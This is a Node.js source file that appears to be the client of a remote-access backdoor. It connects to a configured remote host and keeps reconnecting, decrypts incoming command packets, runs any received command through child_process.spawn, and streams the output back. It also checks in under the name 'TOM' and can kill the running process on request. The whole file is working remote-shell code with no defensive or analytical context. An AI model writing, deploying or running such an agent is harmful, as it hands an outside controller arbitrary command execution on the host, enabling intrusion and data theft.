var net = require('net');
var crypto = require('./utils/crypto');
var delay = require('./utils/delay');
var config = require('./config.json');
var parser = require('./utils/parser');
var logger = require('./utils/logger');
var Packet = require('./models/packet')
var spawn = require('child_process').spawn;

var sender_id;
var receiver_id;
var baseSocket;
var socketOpen = false;

function openSocket() {
    if (!socketOpen) {
        baseSocket = net.connect({
            port: config.port,
            host: config.host
        });
        baseSocket.setKeepAlive(true);
        baseSocket.setEncoding(config.default_encoding);
        baseSocket.on('connect', onConnect.bind({}, baseSocket));
        baseSocket.on('error', destroySocket.bind({}, baseSocket));
        baseSocket.on('data', onData.bind({}, baseSocket));
        baseSocket.on('close', destroySocket.bind({}, baseSocket));
        socketOpen = true;
    }

}
var onConnect = function() {
    console.log('-> SERVER : Succesfully connected');
};

var onData = function(socket, cipher) {
    var data = crypto.decrypt(cipher);
    if (!parser.isValid(data)) {
        return;
    }
    var packet = parser.decode(data);
    receiver_id = packet.sender_id;
    sender_id = packet.receiver_id;
    processPacket(packet);
};
var send = function(data) {
    let parsedPacket = parser.encode(data);
    console.log(`raw Packet: ${data}`);
    console.log(`parsed Packet: ${parsedPacket}`);
    let encryptedPacket = crypto.encrypt(parsedPacket);
    baseSocket.write(encryptedPacket);
};
var destroySocket = function() {
    // Kill socket
    if (socketOpen) {
        console.log('Killing socket');
        baseSocket.end();
        baseSocket.destroy();
        baseSocket.unref();
        socketOpen = false;
    }

    // Re-open socket
    var timeout = setTimeout(openSocket, delay.get());
};

var processPacket = function(packet) {
    //var parsedPacket = parser.decode(packet);
    for (let cmd in packet.data) {
        processCommand(cmd, packet.data[cmd], packet);
    }
};

var childObject;
var processCommand = function(cmd, cmdData) {
    if (cmd === 'cmd') {
        var output;
        console.log(`cmdData ${cmdData}`);

        var splitted = cmdData.split(' ');
        console.log(`splitted: ${splitted}`);
        var firstElement = splitted[0];
        splitted.shift();
        var args = splitted;
        console.log(`args: ${args}`);
        if (args === firstElement) args = [];
        childObject = spawn(firstElement, args, {
            detached: true
        });

        childObject.stdout.setEncoding('utf8');
        childObject.stdout.on('data', function(data) {
            console.log('stdout: ' + data);
            output = data;
            lines = output.split(/((\r\n))/g).join();
            var toSend = new Packet(sender_id, receiver_id, {
                output: lines.toString("utf8")
            });
            send(toSend);
        });
    } else if (cmd === "sig") {
        try {
            childObject.kill();
        } catch (err) {
            console.log(err);
        }
    } else if (cmd === "ack") {
        var toSend = new Packet(sender_id, receiver_id, {
            name: "TOM".toString('utf8')
        });
        send(toSend);
    }
};


openSocket();
